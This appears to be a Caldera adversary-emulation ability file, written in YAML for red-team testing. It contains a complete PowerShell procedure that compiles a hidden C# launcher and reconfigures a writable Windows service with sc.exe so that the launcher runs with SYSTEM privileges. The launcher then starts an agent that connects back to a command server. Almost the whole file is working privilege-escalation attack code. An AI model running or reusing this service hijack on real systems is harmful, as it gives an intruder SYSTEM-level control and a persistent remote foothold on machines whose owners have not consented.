- id: f0c1d2e3-a4b5-4c6d-8e7f-9a0b1c2d3e4f
  name: Privilege Escalation - Service Hijack via Custom C# Launcher
  description: Compiles and hijacks a vulnerable service to launch a Caldera agent with SYSTEM privileges.
  tactic: privilege-escalation
  technique:
    attack_id: T1574.011
    name: "Hijack Execution Flow: Services File Permissions Weakness"
  requirements:
    - plugins.stockpile.app.requirements.existential:
      - source: service.name.writable
  platforms:
    windows:
      psh:
        command: |
          $payloadDirectory = "C:\Users\Public";
          $csFilePath = Join-Path -Path $payloadDirectory -ChildPath "svc-launcher.cs";
          $exeFilePath = Join-Path -Path $payloadDirectory -ChildPath "svc-launcher.exe";
          $csharpLines = @(
              'using System;',
              'using System.Diagnostics;',
              'using System.Threading;',
              'namespace SvcLauncher {',
              '    class Program {',
              '        static void Main(string[] args) {',
              '            try {',
              '                string payloadPath = @"{AGENT_PATH}";',
              '                string payloadArgs = "-server {SERVER_ADDRESS} -group system-pwned";',
              '                ProcessStartInfo psi = new ProcessStartInfo {',
              '                    FileName = payloadPath,',
              '                    Arguments = payloadArgs,',
              '                    UseShellExecute = false,',
              '                    CreateNoWindow = true,',
              '                    WindowStyle = ProcessWindowStyle.Hidden',
              '                };',
              '                Process.Start(psi);',
              '            } catch {}',
              '            Thread.Sleep(30000);',
              '        }',
              '    }',
              '}'
          );
          $codeTemplate = $csharpLines -join [Environment]::NewLine;
          $agentPathForCS = '#{location}'.Replace('\', '\\');
          $finalCode = $codeTemplate `
              -replace '\{AGENT_PATH\}', $agentPathForCS `
              -replace '\{SERVER_ADDRESS\}', '#{server}';
          Set-Content -Path $csFilePath -Value $finalCode -Force;
          $compilerPath = @("C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe", "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") | Where-Object { Test-Path $_ } | Select-Object -First 1;
          if (-not $compilerPath) {
              Write-Error "No C# compiler found!"; exit
          };
          & $compilerPath /nologo /out:$exeFilePath $csFilePath;
          $status = sc.exe config '#{service.name.writable}' binPath= "$exeFilePath";
          if ($status -eq "[SC] ChangeServiceConfig SUCCESS") {
              Write-Host "SUCCESS #{service.name.writable} service hijacked";
          };

          #sc.exe start "#{service.name.writable}";

        parsers:
          plugins.adversary_emulation.app.parsers.regex_parser:
            - source: service.binpath.modified
              custom_parser_vals:
                regex: 'SUCCESS (.*) service hijacked'
                edge_label: named